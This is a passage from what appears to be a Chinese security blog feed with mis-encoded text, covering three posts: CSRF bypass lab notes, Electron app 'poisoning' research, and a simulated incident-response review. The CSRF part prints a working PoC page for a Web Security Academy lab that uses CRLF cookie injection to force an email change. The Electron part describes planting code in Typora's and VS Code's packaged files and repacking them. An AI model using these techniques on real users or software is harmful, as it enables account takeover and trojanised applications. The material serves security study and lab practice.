web-security-academy.netï¼ˆå­˜åœ¨CRLFæ¼æ´çš„å®Œæ•´URLï¼‰ä¸Šçš„ä¸€ä¸ªä¸å­˜åœ¨çš„å›¾ç‰‡ï¼Œå½“å®ƒå‘é€è¿™ä¸ªè¯·æ±‚çš„æ—¶å€™ï¼Œ web-security-academy.net çš„ cookie ä¸­çš„ csrf é”®å°†è¢«è®¾ç½®ä¸º csrf&#x3D;123456ï¼Œå½“è¯·æ±‚å¤±è´¥çš„æ—¶å€™ï¼Œå°±ä¼šæäº¤æˆ‘ä»¬çš„ CSRF ä»£ç æ¥ä¿®æ”¹é‚®ç®±</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://0a7c00ee0362ba6884d4dc8700fe006e.web-security-academy.net/my-account/change-email&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;111<span class="hljs-symbol">&amp;#64;</span>normal<span class="hljs-symbol">&amp;#45;</span>user<span class="hljs-symbol">&amp;#46;</span>net&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;csrf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123456&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://0a7c00ee0362ba6884d4dc8700fe006e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=123456%3b%20SameSite=None&quot;</span>  <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;document.forms[0].submit();&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-17.png" class="" title="2024-02-05_22-17.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-16.png" class="" title="2024-02-05_22-16.png"><h4 id="åˆ é™¤-referer-å¤´"><a href="#åˆ é™¤-referer-å¤´" class="headerlink" title="åˆ é™¤ referer å¤´"></a>åˆ é™¤ referer å¤´</h4><p>è¿™æ¬¡æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ•°æ®åŒ…ä¸­å¦‚æœæˆåŠŸä¿®æ”¹çš„è¯ä¼šè‡ªåŠ¨è·³è½¬ï¼ŒåŒæ—¶è¯·æ±‚åŒ…é‡Œæœ‰ referer å¤´ï¼Œé€šå¸¸è¿™ç§æƒ…å†µå­˜åœ¨äºå¼€å‘äººå‘˜åœ¨å†™ä»£ç çš„æ—¶å€™æ²¡æœ‰è€ƒè™‘åˆ° referer å¤´ä¸å­˜åœ¨çš„æƒ…å†µä¸‹çš„å¤„ç†é€»è¾‘ï¼Œå¯¼è‡´ç»•è¿‡äº† referer æ ¡éªŒã€‚ä½†ç”±äº referer å¤´æ˜¯æµè§ˆå™¨è‡ªåŠ¨æ·»åŠ çš„è¯·æ±‚å¤´ï¼Œæ‰€ä»¥é€šè¿‡ä¸Šé¢çš„æ–¹å¼å»è¦æ±‚ referer å¤´ç­‰äºæŸä¸ªç‰¹å®šçš„å€¼æ¥ç»•è¿‡ referer æ ¡éªŒæ˜¯ä¸å¯è¡Œçš„ï¼Œé‚£æˆ‘ä»¬çœ‹çœ‹æŠŠä»–æ”¹ä¸€ä¸‹ä¼šæ˜¯ä»€ä¹ˆå“åº”</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-28.png" class="" title="2024-02-05_22-28.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-29.png" class="" title="2024-02-05_22-29.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>è¿™é‡ŒæŠ¥é”™æ˜¯æ— æ•ˆçš„ refererï¼Œé‚£æˆ‘ä»¬çœ‹çœ‹åˆ äº†å®ƒä¼šæœ‰ä»€ä¹ˆå“åº”</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-29_1.png" class="" title="2024-02-05_22-29_1.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>å¯ä»¥çœ‹åˆ°æ˜¯æˆåŠŸçš„ï¼Œé‚£ä¹ˆä¸‹ä¸€æ­¥å°±æ˜¯å¦‚ä½•åœ¨ POC é‡Œè®©å®ƒä¸å‘é€ referer å¤´äº†ï¼Œè¿™å°±éœ€è¦å€ŸåŠ© meta æ ‡ç­¾äº†ï¼ˆmeta æ ‡ç­¾ç”¨äºæä¾›å…³äº HTML æ–‡æ¡£çš„å…ƒæ•°æ®ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥æ§åˆ¶å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚çš„æ—¶å€™æ˜¯å¦æºå¸¦æŸä¸ªè¯·æ±‚å¤´ï¼‰ï¼Œè¿™é‡Œå°±æ˜¯é€šè¿‡ meta æ ‡ç­¾ï¼Œæ¥æ§åˆ¶å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ä¸å« referer(no-referer)ï¼Œpayloadå¦‚ä¸‹</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-33.png" class="" title="2024-02-05_22-33.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-35.png" class="" title="2024-02-05_22-35.png"><h2 id="CSRFé˜²èŒƒæªæ–½"><a href="#CSRFé˜²èŒƒæªæ–½" class="headerlink" title="CSRFé˜²èŒƒæªæ–½"></a>CSRFé˜²èŒƒæªæ–½</h2><p>1ã€éªŒè¯ HTTP Referer å­—æ®µ<br>2ã€åœ¨è¯·æ±‚åœ°å€ä¸­æ·»åŠ  token å¹¶éªŒè¯<br>3ã€åœ¨ HTTP å¤´ä¸­è‡ªå®šä¹‰å±æ€§å¹¶éªŒè¯<br>4ã€æµè§ˆå™¨ç«¯å¯ç”¨ SameSite cookie</p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æµ‹è¯•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¼æ´æ€»ç»“</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ElectronæŠ•æ¯’æ”»å‡»çš„ç ”ç©¶</title>
    <link href="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/"/>
    <url>/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯Electronï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Electronï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Electronï¼Ÿ"></a>ä»€ä¹ˆæ˜¯Electronï¼Ÿ</h2><p>Electronæ˜¯ç”±Githubå¼€å‘ï¼Œç”¨HTMLï¼ŒCSSå’ŒJavaScriptæ¥æ„å»ºè·¨å¹³å°æ¡Œé¢åº”ç”¨ç¨‹åºçš„ä¸€ä¸ªå¼€æºåº“ã€‚ Electroné€šè¿‡å°†Chromiumå’ŒNode.jsåˆå¹¶åˆ°åŒä¸€ä¸ªè¿è¡Œæ—¶ç¯å¢ƒä¸­ï¼Œå¹¶å°†å…¶æ‰“åŒ…ä¸ºMacï¼ŒWindowså’ŒLinuxç³»ç»Ÿä¸‹çš„åº”ç”¨æ¥å®ç°è¿™ä¸€ç›®çš„ã€‚é€šè¿‡Nodeå®ƒæä¾›äº†é€šå¸¸æµè§ˆå™¨æ‰€ä¸èƒ½æä¾›çš„èƒ½åŠ›ã€‚ä¸€ä¸ªåŸºç¡€çš„ElectronåŒ…å«ä¸‰ä¸ªæ–‡ä»¶ï¼špackage.jsonï¼ˆå…ƒæ•°æ®ï¼‰ã€main.jsï¼ˆä»£ç ï¼‰å’Œindex.htmlï¼ˆå›¾å½¢ç”¨æˆ·ç•Œé¢ï¼‰ã€‚æ¡†æ¶ç”±Electronå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆWindowsä¸­ä¸ºelectron.exeã€macOSä¸­ä¸ºelectron.appã€Linuxä¸­ä¸ºelectronï¼‰æä¾›ã€‚å¼€å‘è€…å¯ä»¥è‡ªè¡Œæ·»åŠ æ ‡å¿—ã€è‡ªå®šä¹‰å›¾æ ‡ã€é‡å‘½åæˆ–ç¼–è¾‘Electronå¯æ‰§è¡Œæ–‡ä»¶</p><p>Electronçš„ä¼˜ç‚¹ï¼š<br>å…¼å®¹æ€§ï¼šè™½ç„¶ä½ è¿˜åœ¨ç”¨WEBæŠ€æœ¯è¿›è¡Œå¼€å‘ï¼Œä½†æ˜¯ä½ ä¸ç”¨å†è€ƒè™‘å…¼å®¹æ€§é—®é¢˜äº†ï¼Œä½ åªéœ€è¦å…³å¿ƒä½ å½“å‰ä½¿ç”¨Electronçš„ç‰ˆæœ¬å¯¹åº”Chromeçš„ç‰ˆæœ¬ï¼Œä¸€èˆ¬æƒ…å†µä¸‹å®ƒå·²ç»è¶³å¤Ÿæ–°æ¥è®©ä½ ä½¿ç”¨æœ€æ–°çš„APIå’Œè¯­æ³•äº†ï¼Œä½ è¿˜å¯ä»¥æ‰‹åŠ¨å‡çº§Chromeç‰ˆæœ¬ã€‚åŒæ ·çš„ï¼Œä½ ä¹Ÿä¸ç”¨è€ƒè™‘ä¸åŒæµè§ˆå™¨å¸¦çš„æ ·å¼å’Œä»£ç å…¼å®¹é—®é¢˜</p><p>NodeJSç¯å¢ƒï¼šè¿™å¯èƒ½æ˜¯å¾ˆå¤šå‰ç«¯å¼€å‘è€…æ›¾ç»æ¢¦æƒ³è¿‡çš„åŠŸèƒ½ï¼Œåœ¨WEBç•Œé¢ä¸­ä½¿ç”¨Node.jsæä¾›çš„å¼ºå¤§APIï¼Œè¿™æ„å‘³ç€ä½ åœ¨WEBé¡µé¢ç›´æ¥å¯ä»¥æ“ä½œæ–‡ä»¶ï¼Œè°ƒç”¨ç³»ç»ŸAPIï¼Œç”šè‡³æ“ä½œæ•°æ®åº“ã€‚å½“ç„¶ï¼Œé™¤äº†å®Œæ•´çš„ Node APIï¼Œä½ è¿˜å¯ä»¥ä½¿ç”¨é¢å¤–çš„å‡ åä¸‡ä¸ªnpmæ¨¡å—</p><p>è·¨åŸŸï¼šä½ å¯ä»¥ç›´æ¥ä½¿ç”¨Nodeæä¾›çš„requestæ¨¡å—è¿›è¡Œç½‘ç»œè¯·æ±‚ï¼Œè¿™æ„å‘³ç€ä½ æ— éœ€å†è¢«è·¨åŸŸæ‰€å›°æ‰°</p><p>å¼ºå¤§çš„æ‰©å±•æ€§ï¼šå€ŸåŠ©node-ffiï¼Œä¸ºåº”ç”¨ç¨‹åºæä¾›å¼ºå¤§çš„æ‰©å±•æ€§</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/Electron_20.0.3_screenshot.png" class="" title="Electron_20.0.3_screenshot.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>ç°åœ¨å¸‚é¢ä¸Šå·²ç»æœ‰éå¸¸å¤šçš„åº”ç”¨åœ¨ä½¿ç”¨Electronè¿›è¡Œå¼€å‘äº†ï¼ŒåŒ…æ‹¬æˆ‘ä»¬ç†Ÿæ‚‰çš„VS Codeå®¢æˆ·ç«¯ã€GitHubå®¢æˆ·ç«¯ã€Atomå®¢æˆ·ç«¯ç­‰ç­‰</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/20230620170908414.png" class="" title="20230620170908414.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://zhuanlan.zhihu.com/p/69109695">https://zhuanlan.zhihu.com/p/69109695</a><br><a href="https://zh.wikipedia.org/wiki/Electron#">https://zh.wikipedia.org/wiki/Electron#</a></p><h2 id="ElectronæŠ•æ¯’åŸç†"><a href="#ElectronæŠ•æ¯’åŸç†" class="headerlink" title="ElectronæŠ•æ¯’åŸç†"></a>ElectronæŠ•æ¯’åŸç†</h2><p>Electroné€šå¸¸æ˜¯é€šè¿‡ASARè¿›è¡Œæ‰“åŒ…ä»¥åŠåˆ†å‘åº”ç”¨ç¨‹åºçš„ã€‚å› ä¸ºASARå¯ä»¥å°†ä¸åº”ç”¨ç¨‹åºç›¸å…³çš„æ‰€æœ‰æ–‡ä»¶ä»¥åŠç›®å½•å•ç‹¬æ‰“åŒ…æˆä¸€ä¸ªç‹¬ç«‹çš„æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯.asaræ–‡ä»¶ï¼ˆé€šå¸¸åœ¨resourcesæ–‡ä»¶å¤¹ä¸‹é¢ï¼‰ï¼Œæ‰€ä»¥å®ƒæœ€å¤§çš„ä¼˜åŠ¿åœ¨ä¸å¯ä»¥åœ¨å¤šå¹³å°è¿è¡Œã€‚è€ŒElectronæŠ•æ¯’åˆ™æ˜¯é€šè¿‡å¯¹ASARæ–‡ä»¶è¿›è¡Œè§£åŒ…ä¹‹ååœ¨æºä»£ç ä»¥åŠä¾èµ–ä¸­æ¤å…¥æ¶æ„ä»£ç ï¼Œæˆ–è€…è°ƒè¯•æ¨¡å¼æ³¨å…¥ä»£ç ï¼Œä»è€Œå®ç°æ¶æ„å‘½ä»¤æ‰§è¡Œã€æ¤å…¥åé—¨æœ¨é©¬ç­‰è¡Œä¸ºï¼Œè€Œä¸”Electroné€šå¸¸å¸¦æœ‰å¯ä¿¡çš„æ•°å­—ç­¾åï¼Œæ‰€ä»¥æ¤å…¥çš„æ¶æ„ä»£ç ä¸ä¼šç ´åç­¾åæ ¡éªŒ</p><h2 id="æ”»å‡»å¸¸ç”¨æ‰‹æ³•"><a href="#æ”»å‡»å¸¸ç”¨æ‰‹æ³•" class="headerlink" title="æ”»å‡»å¸¸ç”¨æ‰‹æ³•"></a>æ”»å‡»å¸¸ç”¨æ‰‹æ³•</h2><h3 id="node-modulesæŠ•æ¯’"><a href="#node-modulesæŠ•æ¯’" class="headerlink" title="node_modulesæŠ•æ¯’"></a>node_modulesæŠ•æ¯’</h3><p>é€šè¿‡å¯¹Electronåº”ç”¨ç¨‹åºä¸­çš„node_modulesä¾èµ–é¡¹ä¸­æ¤å…¥æ¶æ„ä»£ç ï¼Œåº”ç”¨ç¨‹åºè¿è¡Œæ—¶ä¼šè¢«åŠ è½½å¹¶æ‰§è¡Œæ¶æ„æ“ä½œï¼Œæ¥ä¸‹æ¥æˆ‘ä»¥typoraä¸ºä¾‹ï¼Œtyporaä¸ºä¾‹æ˜¯ä¸€æ¬¾éå¸¸å¥½ç”¨çš„markdownç¼–è¾‘å™¨</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-18.png" class="" title="2024-02-04_10-18.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-17.png" class="" title="2024-02-04_10-17.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>typoraå®‰è£…ç›®å½•ä¸‹çš„resourcesæ–‡ä»¶å¤¹æœ‰ä¸€ä¸ªnode_modules.asarï¼Œå¯¹å®ƒè¿›è¡Œè§£åŒ…</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-19.png" class="" title="2024-02-04_10-19.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-29.png" class="" title="2024-02-04_10-29.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>ç„¶ååœ¨ravenåº“ä¸­æ¤å…¥æ¶æ„ä»£ç ï¼Œå› ä¸ºè¿™ä¸ªåº“ä¼šåœ¨æ‰“å¼€typoraæ—¶ä¼šè¢«åŠ è½½ï¼Œè¿™é‡Œæˆ‘ä»¬é€šè¿‡è§¦å‘è®¡ç®—å™¨æ¥æ¨¡æ‹Ÿæ¼”ç¤ºæ‰§è¡Œæ¶æ„ä»£ç çš„æ•ˆæœ</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-39_1.png" class="" title="2024-02-04_10-39_1.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>ä¿å­˜åé€šè¿‡ASARå†æ‰“åŒ…å›å»<br>asar pack .&#x2F;node_modules_extract node_modules.asar<br>å½“æˆ‘ä»¬é‡å¯typoraçš„æ—¶å€™å‘ç°æ‰§è¡Œäº†æ¶æ„ä»£ç </p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-42.png" class="" title="2024-02-04_10-42.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><h3 id="å…¥å£æ–‡ä»¶æŠ•æ¯’"><a href="#å…¥å£æ–‡ä»¶æŠ•æ¯’" class="headerlink" title="å…¥å£æ–‡ä»¶æŠ•æ¯’"></a>å…¥å£æ–‡ä»¶æŠ•æ¯’</h3><p>æ”»å‡»è€…å¯ä»¥åœ¨åº”ç”¨çš„å…¥å£æ–‡ä»¶ï¼ˆå¦‚main.jsç­‰ï¼‰ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼Œå½“åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶ï¼Œè¿™äº›ä»£ç ä¼šè¢«æ‰§è¡Œã€‚ä¸‹é¢æˆ‘ä»¥ç¨‹åºå‘˜å¸¸ç”¨çš„ä»£ç ç¼–è¾‘å™¨vscodeæ¥æ¼”ç¤ºï¼Œæ‰¾åˆ°vscodeçš„åº”ç”¨é…ç½®æ–‡ä»¶package.jsonï¼Œé€šè¿‡æŸ¥çœ‹mainå­—æ®µï¼Œå‘ç°å…¥å£æ–‡ä»¶ä¸ºoutç›®å½•ä¸‹é¢çš„main</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-59.png" class="" title="2024-02-04_10-59.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>éšåæˆ‘ä»¬æ‰¾åˆ°outç›®å½•ä¸‹é¢çš„main,å¹¶æ¤å…¥æ¶æ„ä»£ç ï¼Œä¿å­˜å®ŒåŒæ ·ç”¨ASARå†æ‰“åŒ…å›å»ï¼Œé‡å¯vscodeå¯ä»¥å‘ç°è§¦å‘äº†æ¶æ„ä»£ç </p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_11-03.png" class="" title="2024-02-04_11-03.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_11-05.png" class="" title="2024-02-04_11-05.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><h3 id="è°ƒè¯•æ¨¡å¼æ³¨å…¥"><a href="#è°ƒè¯•æ¨¡å¼æ³¨å…¥" class="headerlink" title="è°ƒè¯•æ¨¡å¼æ³¨å…¥"></a>è°ƒè¯•æ¨¡å¼æ³¨å…¥</h3><p>é€šè¿‡chromeçš„inspectåŠŸèƒ½å®ç°åœ¨è°ƒè¯•æ¨¡å¼ä¸‹æ³¨å…¥æ¶æ„ä»£ç ,å¯ä»¥ç›´æ¥å‚è€ƒå¼€æºé¡¹ç›®ï¼š<a href="https://github.com/djerryz/electron_shell">https://github.com/djerryz/electron_shell</a></p>]]></content>
    
    
    <categories>
      
      <category>ç ”ç©¶æ—¥å¸¸</category>
      
    </categories>
    
    
    <tags>
      
      <tag>test</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€æ¬¡åº”æ€¥å“åº”çš„æ¨¡æ‹Ÿå¤ç›˜</title>
    <link href="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/"/>
    <url>/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/</url>
    
    <content type="html"><![CDATA[<h2 id="äº‹ä»¶èƒŒæ™¯"><a href="#äº‹ä»¶èƒŒæ™¯" class="headerlink" title="äº‹ä»¶èƒŒæ™¯"></a>äº‹ä»¶èƒŒæ™¯</h2><p>æŸå…¬å¸WebServeræœåŠ¡å™¨é­åˆ°æ”»å‡»è€…å…¥ä¾µï¼Œç°ç–‘ä¼¼è¯¥æœåŠ¡å™¨çš„åº”ç”¨ç³»ç»Ÿè¢«ä¸Šä¼ æ¶æ„è½¯ä»¶æˆ–åé—¨ï¼Œå¾ˆå¤šé‡è¦æ–‡ä»¶è¢«ç ´åï¼Œç°å¯åŠ¨ç½‘ç»œå®‰å…¨äº‹ä»¶åº”æ€¥å“åº”ï¼Œå…¥æ‰‹æ¥ç®¡è¯¥æœåŠ¡å™¨ï¼Œå‘ç°æ”»å‡»è€…æ”¾ç½®çš„æ¶æ„è½¯ä»¶æˆ–åé—¨ï¼Œåˆ†æè¿˜åŸæ”»å‡»è€…å¦‚ä½•å…¥ä¾µè¿›æœåŠ¡å™¨</p><h2 id="å¤ç›˜"><a href="#å¤ç›˜" class="headerlink" title="å¤ç›˜"></a>å¤ç›˜</h2><p>æ‹¿åˆ°æœåŠ¡å™¨å‘ç°å¼€æ”¾ç€80ç«¯å£ï¼Œæ˜¯å…·æœ‰webç«¯çš„ï¼Œäºæ˜¯åˆæ­¥çŒœæµ‹ï¼Œæ”»å‡»è€…ä»webç«¯å…¥çš„æ‰‹ï¼Œæ‹¿åˆ°webshell,ä»è€Œè¿›ä¸€æ­¥æ”»å‡»æ§åˆ¶çš„æœåŠ¡å™¨ï¼Œäºæ˜¯çœ‹ä¸€ä¸‹webæ—¥å¿—ï¼Œå‘ç°äº†apacheæ–‡ä»¶å¤¹ï¼Œå¯ä»¥æ–­å®šç½‘é¡µç”¨çš„apache</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-20.png" class="" title="2024-02-03_16-20.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>æŸ¥çœ‹apacheæ—¥å¿—æ–‡ä»¶å¤¹ï¼Œé‡Œé¢æœ‰å¤šä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œè¿›è¡Œé€ä¸€æŸ¥çœ‹ï¼Œå› ä¸ºæ•°æ®å¤ªå¤§ä¸æ–¹ä¾¿æŸ¥çœ‹ä¸æ•´ç†ï¼Œæˆ‘ç”¨æœ¬æœºè¿›è¡Œsshè¿æ¥ï¼Œå°†æ—¥å¿—æ–‡ä»¶å¤åˆ»ä¸‹æ¥ï¼Œé€šè¿‡ç¼–è¾‘å™¨æŸ¥çœ‹æ›´æ–¹ä¾¿äº›ã€‚</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-21.png" class="" title="2024-02-03_16-21.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>ä¸‹è½½ä¸‹æ¥ä¹‹åï¼Œå¼€å§‹è¿›è¡Œæ—¥å¿—åˆ†æï¼Œå› ä¸ºæ•°æ®é‡å¤ªå¤§ã€ä¿¡æ¯é‡å¤ªå¤§ï¼Œéœ€è¦èŠ±å¾ˆå¤§çš„è€å¿ƒï¼Œç»ˆäºåœ¨184è¡Œå‘ç°äº†dirsearchæ”»å‡»å·¥å…·çš„ç—•è¿¹ï¼Œå¹¶ä¸”ä¸€ç›´æŒç»­åˆ°9000å¤šè¡Œï¼Œå¯ä»¥åˆ¤æ–­æ”»å‡»è€…è¿›è¡Œäº†ç›®å½•æ‰«æï¼Œå¹¶ä¸”æ”»å‡»IPéƒ½æŒ‡å‘äº†192.168.1.7ï¼ˆæ¨¡æ‹Ÿç¯å¢ƒï¼‰,å› æ­¤æˆ‘ä»¬å¾—åˆ°äº†æ”»å‡»è€…çš„IP</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-28.png" class="" title="2024-02-03_16-28.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-31.png" class="" title="2024-02-03_16-31.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>æ—¢ç„¶å¾—åˆ°äº†æ”»å‡»IPï¼Œé€šè¿‡å®šä½IPå¾—åˆ°äº†æ”»å‡»è€…çš„uaå¤´ï¼Œæ”»å‡»è€…ç”¨çš„Linux x86_64ç³»ç»Ÿ</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-29.png" class="" title="2024-02-03_16-29.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>ç•¥è¿‡å¤§é‡çš„ç›®å½•æ‰«ææ—¥å¿—æ•°æ®ï¼Œæ¥ç€å¾€ä¸‹åˆ†æï¼Œåœ¨9203è¡Œé™„è¿‘å‘ç°è·¯å¾„å‚æ•°é‡Œæœ‰ä¸ª1.phpæ–‡ä»¶ï¼Œå¹¶ä¸”åé¢åšäº†id , whoami , bashåå¼¹shellçš„è¡Œä¸ºï¼Œè¿™é‡Œå¯ä»¥åˆ¤æ–­æ”»å‡»è€…è¿›è¡Œäº†ä¼ é©¬ã€å‘½ä»¤æ‰§è¡Œã€æ‹¿webshellçš„è¡Œä¸ºï¼Œé‡ç‚¹æ˜¯å“åº”å‡ä¸º200,è¯´æ˜æ”»å‡»æˆåŠŸï¼Œä¹Ÿå°±æ˜¯è¯´24&#x2F;Apr&#x2F;2022:15:26:42 è¿™ä¸ªæ—¶é—´æ‰“è¿›æ¥çš„</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-33.png" class="" title="2024-02-03_16-33.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-57.png" class="" title="2024-02-03_16-57.png"><h6 id="-6"><a href="#-6" class="headerlink" 